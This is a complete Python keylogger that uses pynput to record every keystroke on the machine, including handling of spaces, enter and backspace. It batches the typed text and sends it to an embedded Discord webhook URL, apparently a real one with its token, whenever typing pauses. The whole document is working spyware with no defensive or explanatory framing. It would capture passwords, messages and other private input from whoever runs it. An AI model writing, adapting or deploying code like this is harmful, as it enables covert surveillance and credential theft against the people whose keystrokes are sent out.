from pynput.keyboard import Listener, Key
import requests
import threading
import time

# Replace this with your Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1232345214388273153/vXrXVj3waCeAEG3eqJn9gtMkgoVifzOk9oGjo7AuuBwHfFFwtvRJUa061qJ5Qu9N1FXq'

buffer = ""
last_key_time = time.time()
lock = threading.Lock()

def send_to_discord(message):
    if message:  # Ensure message is not empty
        data = {'content': message}
        requests.post(WEBHOOK_URL, json=data)

def handle_buffer():
    global buffer
    while True:
        with lock:
            if time.time() - last_key_time > 0.5:
                if buffer:
                    send_to_discord(buffer)
                    buffer = ""
        time.sleep(0.1)

def on_press(key):
    global buffer, last_key_time
    try:
        with lock:
            if key == Key.space or key == Key.enter:
                # When space or enter is pressed, append it to buffer and reset timing
                buffer += ' ' if key == Key.space else '\n'
                last_key_time = time.time()  # Reset the timer for word/sentence end
            elif key == Key.backspace:
                # Handle backspace to remove last character from buffer
                buffer = buffer[:-1]
                last_key_time = time.time()  # Reset the timer
            else:
                # Append character keys to the buffer
                buffer += key.char
                last_key_time = time.time()  # Reset the timer
    except AttributeError:
        # Handle special keys; could be logged or ignored based on requirements
        pass

# Start a background thread to handle the buffer based on timing
threading.Thread(target=handle_buffer, daemon=True).start()

# Setup the listener
with Listener(on_press=on_press) as listener:
    listener.join()
